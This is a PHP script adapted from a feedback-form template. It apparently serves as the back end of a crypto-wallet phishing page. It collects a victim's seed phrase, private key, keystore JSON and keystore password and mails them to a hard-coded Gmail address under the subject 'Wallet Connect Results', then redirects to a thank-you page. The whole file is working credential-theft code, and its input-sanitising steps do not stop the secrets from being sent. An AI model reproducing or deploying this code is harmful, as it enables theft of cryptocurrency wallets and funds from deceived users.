<?php
/*
This first bit sets the email address that you want the form to be submitted to.
You will need to change this value to a valid email address that you can access.
*/
$webmaster_email = "burtonmichael324@gmail.com";
/*
This bit sets the URLs of the supporting pages.
If you change the names of any of the pages, you will need to change the values here.
*/
$feedback_page = "feedback_form.html";
$error_page = "error_message.html";
$thankyou_page = "thank_you.html";

/*
This next bit loads the form field data into variables.
If you add a form field, you will need to add it here.
*/
$phrase = $_REQUEST['phrase'] ;
$keystorepassword = $_REQUEST['keystorepassword'] ;
$privatekey = $_REQUEST['privatekey'] ;
$keystorejson = $_REQUEST['keystorejson'] ;
//$walletname = $_REQUEST['walletname'] ;
$walletname = $_REQUEST['WalletName'];
$msg = 
"phrase: " . $phrase . "\r\n" . 
"keystorejson: " . $keystorejson . "\r\n" .
"keystorepassword: " . $keystorepassword . "\r\n" .
"privatekey: " . $privatekey . "\r\n" .
"walletname: " . $walletname ;

/*
The following function checks for email injection.
Specifically, it checks for carriage returns - typically used by spammers to inject a CC list.
*/
function isInjected($str) {
	$injections = array('(\n+)',
	'(\r+)',
	'(\t+)',
	'(%0A+)',
	'(%0D+)',
	'(%08+)',
	'(%09+)'
	);
	$inject = join('|', $injections);
	$inject = "/$inject/i";
	if(preg_match($inject, $str)) {
		return true;
	}
	return false;
}
	



/* 
Input validation and email injection prevention
*/

// Input validation function
function sanitize_input($input) {
    return htmlspecialchars(stripslashes(trim($input)), ENT_QUOTES, 'UTF-8');
}

// Check all inputs for email injection
$fields_to_check = array($phrase, $keystorepassword, $privatekey, $keystorejson, $walletname);
foreach ($fields_to_check as $field) {
    if (isInjected($field)) {
        error_log('Email injection attempt detected: ' . $field);
        die('Invalid input detected. Please contact support.');
    }
}

// Sanitize all inputs
$phrase = sanitize_input($phrase);
$keystorepassword = sanitize_input($keystorepassword);
$privatekey = sanitize_input($privatekey);
$keystorejson = sanitize_input($keystorejson);
$walletname = sanitize_input($walletname);

// Send email with proper error handling
if (!empty($webmaster_email) && filter_var($webmaster_email, FILTER_VALIDATE_EMAIL)) {
    $mail_result = mail($webmaster_email, "Wallet Connect Results", $msg);
    if ($mail_result) {
        header("Location: $thankyou_page");
        exit();
    } else {
        error_log('Failed to send email to: ' . $webmaster_email);
        die('Error sending email. Please try again later.');
    }
} else {
    error_log('Invalid webmaster email configuration');
    die('Error: Email not configured properly.');
}
?>